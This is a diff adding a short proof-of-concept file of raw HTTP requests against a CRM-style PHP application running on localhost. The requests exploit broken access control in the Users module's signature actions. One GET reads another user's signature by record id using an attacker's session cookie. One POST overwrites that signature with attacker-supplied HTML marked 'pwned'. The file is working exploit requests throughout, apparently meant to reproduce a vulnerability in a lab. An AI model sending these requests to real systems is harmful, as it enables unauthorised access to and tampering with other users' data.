@@ -1,0 +1,13 @@
+### 1) READ another user's signature by id
+GET /index.php?module=Users&action=PopupSignature&record=d85a492e-d58c-495a-8bee-0b331ec0510c HTTP/1.1
+Host: localhost:33116
+Cookie: PHPSESSID=<attacker-session>
+
+
+### 2) OVERWRITE another user's signature content by id
+POST /index.php?module=Users&action=SaveSignature HTTP/1.1
+Host: localhost:33116
+Cookie: PHPSESSID=<attacker-session>
+Content-Type: application/x-www-form-urlencoded
+
+record=d85a492e-d58c-495a-8bee-0b331ec0510c&name=pwned-by-attacker&description=%3Cp%3EPWNEDSIG033_440c7048%3C%2Fp%3E
